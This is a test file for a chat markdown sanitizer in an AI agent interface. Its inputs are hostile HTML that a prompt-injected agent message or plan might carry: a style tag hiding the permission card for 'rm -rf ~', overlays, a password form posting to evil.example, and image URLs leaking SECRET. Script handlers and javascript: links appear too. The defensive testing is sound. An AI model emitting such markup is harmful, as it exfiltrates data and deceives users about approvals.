import { describe, it, expect, afterEach } from 'vitest'
import { renderChatMarkdown } from './chatMarkdown.js'

// Payloads of the review probes (L5 and the verifier): what a prompt-injected agent message or plan
// could carry. The HTML is parsed into a real document to assert on nodes, never on strings.
function render(markdown, options) {
  const host = document.createElement('div')
  host.innerHTML = renderChatMarkdown(markdown, options)
  return host
}

const FORBIDDEN_NODES = 'style, form, input, button, textarea, select, iframe, object, embed, video, audio, svg, link, meta, base, script, img'

afterEach(() => {
  document.body.innerHTML = ''
  document.head.innerHTML = ''
})

describe('renderChatMarkdown: restricted profile of the chat', () => {
  it('keeps the formatting an answer needs', () => {
    const host = render('# Title\n\nSome **bold**, *italic*, ~~gone~~ and `code`.\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```js\nconst x = 1\n```')
    expect(host.querySelector('h1').textContent).toBe('Title')
    expect(host.querySelector('strong').textContent).toBe('bold')
    expect(host.querySelector('em')).not.toBeNull()
    expect(host.querySelector('del')).not.toBeNull()
    expect(host.querySelectorAll('li')).toHaveLength(2)
    expect(host.querySelector('table td').textContent).toBe('1')
    expect(host.querySelector('pre code').className).toBe('language-js')
  })

  it('drops a <style> tag: it cannot restyle the page around the permission card', () => {
    document.body.innerHTML = '<div class="v3-approval"><span class="v3-approval__object">rm -rf ~</span></div><div id="msg"></div>'
    const object = document.querySelector('.v3-approval__object')
    const before = window.getComputedStyle(object).display
    document.getElementById('msg').innerHTML = renderChatMarkdown('Revise below.\n\n<style>.v3-approval__object{display:none}</style>')
    expect(document.querySelector('style')).toBeNull()
    expect(window.getComputedStyle(object).display).toBe(before)
    expect(document.getElementById('msg').textContent).not.toContain('display:none')
  })

  it('drops the style attribute of every element (a full-screen overlay)', () => {
    const host = render('ok <span style="position:fixed;inset:0;z-index:9999">x</span>\n\n<div style="position:fixed;inset:0;background:red">overlay</div>')
    expect(host.querySelector('[style]')).toBeNull()
    expect(host.textContent).toContain('overlay')
  })

  it('drops forms and every control (in-app phishing)', () => {
    const host = render('<form action="https://evil.example/c" method="post"><input name="pw" type="password" placeholder="Senha"><button>Enviar</button><textarea></textarea><select><option>a</option></select></form>')
    expect(host.querySelector(FORBIDDEN_NODES)).toBeNull()
    expect(host.querySelector('[action], [formaction], [name]')).toBeNull()
  })

  it('drops frames, objects and embedded media (they fetch on render)', () => {
    const host = render('<iframe src="https://evil.example"></iframe><object data="https://evil.example"></object><embed src="https://evil.example"><video src="https://evil.example/v" poster="https://evil.example/p"></video><audio src="https://evil.example/a"></audio>')
    expect(host.querySelector(FORBIDDEN_NODES)).toBeNull()
    expect(host.innerHTML).not.toContain('evil.example')
  })

  it('never creates an image node: a remote image becomes a link the user may open', () => {
    const host = render('Done.\n\n![the chart](https://evil.example/p.png?d=SECRET)')
    expect(host.querySelector('img')).toBeNull()
    const link = host.querySelector('a')
    expect(link.textContent).toBe('the chart')
    expect(link.getAttribute('href')).toBe('https://evil.example/p.png?d=SECRET')
    expect(link.getAttribute('target')).toBe('_blank')
    expect(link.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('a raw <img> with a remote or relative source is not an image either', () => {
    const remote = render('ok <img src="https://evil.example/a?d=SECRET" alt="a">')
    expect(remote.querySelector('img')).toBeNull()
    expect(remote.querySelector('a').getAttribute('href')).toBe('https://evil.example/a?d=SECRET')
    const protocolRelative = render('<img src="//evil.example/a">')
    expect(protocolRelative.querySelector('img')).toBeNull()
    const local = render('<img src="/api/secret" alt="inside">')
    expect(local.querySelector('img, a')).toBeNull()
    expect(local.textContent).toBe('inside')
    const data = render('<img src="data:image/png;base64,AAAA" alt="d">')
    expect(data.querySelector('img')).toBeNull()
    const handler = render('<img src=x onerror="window.__pwned=1">')
    expect(handler.querySelector('img, [onerror]')).toBeNull()
    expect(window.__pwned).toBeUndefined()
  })

  it('keeps no id, name or class that could hit the app (only the language class of a code block)', () => {
    const host = render('<a id="x" name="location" class="v3-approval">a</a><div class="v3-approval" id="app">b</div>\n\n```py\nx\n```')
    expect(host.querySelector('[id], [name]')).toBeNull()
    expect(host.querySelector('a, div').hasAttribute('class')).toBe(false)
    expect(host.querySelector('code').className).toBe('language-py')
  })

  it('keeps blocking script, event handlers and javascript: links', () => {
    const host = render('<script>window.__pwned=1</script><b onclick="window.__pwned=2">x</b> [a](javascript:alert(1)) <svg><a href="javascript:alert(1)"><text>t</text></a></svg>')
    expect(host.querySelector('script, svg, [onclick]')).toBeNull()
    expect(host.querySelector('a')?.getAttribute('href') ?? '').not.toMatch(/javascript/i)
  })

  it('opens external links in a new tab without opener', () => {
    const link = render('[docs](https://example.com/x)').querySelector('a')
    expect(link.getAttribute('target')).toBe('_blank')
    expect(link.getAttribute('rel')).toBe('noopener noreferrer')
  })
})

describe('renderChatMarkdown with rawHtmlAsText (the plan)', () => {
  const asPlan = (markdown) => render(markdown, { rawHtmlAsText: true })

  it('shows raw HTML as text, in blocks and inline', () => {
    const host = asPlan('Intro <b>bold?</b>\n\n<div class="x">block</div>\n\n<style>a{}</style>')
    expect(host.querySelector('b, div, style')).toBeNull()
    expect(host.textContent).toContain('<b>bold?</b>')
    expect(host.textContent).toContain('<div class="x">block</div>')
    expect(host.textContent).toContain('<style>a{}</style>')
  })

  it('a backtick in a link destination does not hide markup from the escape', () => {
    const host = asPlan('# Plan\n\nSee [x](`) <style>.v3-approval{display:none}</style> <img src="https://evil.example/q"> [y](`)')
    expect(host.querySelector(FORBIDDEN_NODES)).toBeNull()
    expect(host.innerHTML).not.toContain('<style')
    expect(host.textContent).toContain('<style>.v3-approval{display:none}</style>')
    expect(host.textContent).toContain('<img src="https://evil.example/q">')
  })

  it('shows markup inside indented and ~~~ code blocks as code, unescaped once and not twice', () => {
    const tilde = asPlan('~~~html\n<div>kept</div>\n~~~')
    expect(tilde.querySelector('pre code').textContent).toBe('<div>kept</div>\n')
    expect(tilde.textContent).not.toContain('&lt;')
    const indented = asPlan('Text\n\n    <div>kept</div>\n')
    expect(indented.querySelector('pre code').textContent).toContain('<div>kept</div>')
    expect(indented.textContent).not.toContain('&lt;')
    const span = asPlan('use `<div>` here')
    expect(span.querySelector('code').textContent).toBe('<div>')
  })

  it('a remote image in the plan is a link, not a request', () => {
    const host = asPlan('![x](https://evil.example/p.png?d=SECRET)')
    expect(host.querySelector('img')).toBeNull()
    expect(host.querySelector('a').getAttribute('href')).toBe('https://evil.example/p.png?d=SECRET')
  })

  it('HTML inside a list item, a quote and a table cell is text too', () => {
    const host = asPlan('- item <b>x</b>\n\n> quote <i>y</i>\n\n| a |\n|---|\n| <u>z</u> |')
    expect(host.querySelector('b, i, u')).toBeNull()
    expect(host.textContent).toContain('<b>x</b>')
    expect(host.textContent).toContain('<i>y</i>')
    expect(host.textContent).toContain('<u>z</u>')
  })
})
